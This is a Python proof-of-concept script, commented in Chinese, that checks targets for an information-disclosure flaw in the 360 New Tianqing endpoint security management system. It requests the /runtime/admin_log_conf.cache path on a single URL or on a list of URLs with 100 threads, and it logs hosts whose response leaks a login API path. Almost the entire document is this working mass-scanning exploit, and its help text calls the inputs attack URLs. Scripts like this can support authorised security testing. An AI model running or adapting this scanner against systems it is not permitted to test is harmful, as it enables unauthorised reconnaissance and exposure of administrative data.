# 360 新天擎终端安全管理系统信息泄露漏洞
# /runtime/admin_log_conf.cache 接口 存在信息泄露
# 导包
import requests,re,sys,argparse
# pool
from multiprocessing.dummy import Pool
# 校验证书错的时候防止报错
requests.packages.urllib3.disable_warnings()

# 指纹模块
def banner():
    # 定义横幅
    banner = """
██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗    ██╗     ███████╗ █████╗ ██╗  ██╗ █████╗  ██████╗ ███████╗
██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║    ██║     ██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔════╝ ██╔════╝
██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║    ██║     █████╗  ███████║█████╔╝ ███████║██║  ███╗█████╗  
██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║    ██║     ██╔══╝  ██╔══██║██╔═██╗ ██╔══██║██║   ██║██╔══╝  
██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║    ███████╗███████╗██║  ██║██║  ██╗██║  ██║╚██████╔╝███████╗
╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                                                                                                version:1.0.0
                                                                                                For:360 新天擎终端安全管理系统信息泄露漏洞                                      
"""
    print(banner)

# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="360 新天擎终端安全管理系统信息泄露漏洞")
    # -u指定单个url检测，-f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your attack-url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your attack-url.txt')
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

# poc模块
def poc(target):
    payload_url = '/runtime/admin_log_conf.cache'
    url = target+payload_url
    header = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    
    try:
        res = requests.get(url=url,headers=header,verify=False)
        matches = re.findall(r'/api/node/login', res.text)
        if '/api/node/login' in matches:
            print(f'该url存在信息泄露漏洞{target}')
            with open('result.txt','a+',encoding='utf-8') as f:
                f.write(target+'\n')
                
        else:
            print(f'该url不存在信息泄露漏洞{target}')
            
    except:
        print(f'该url{target}可能存在访问问题，请手工测试')

def exp():
    pass

if __name__ == '__main__':
    main()
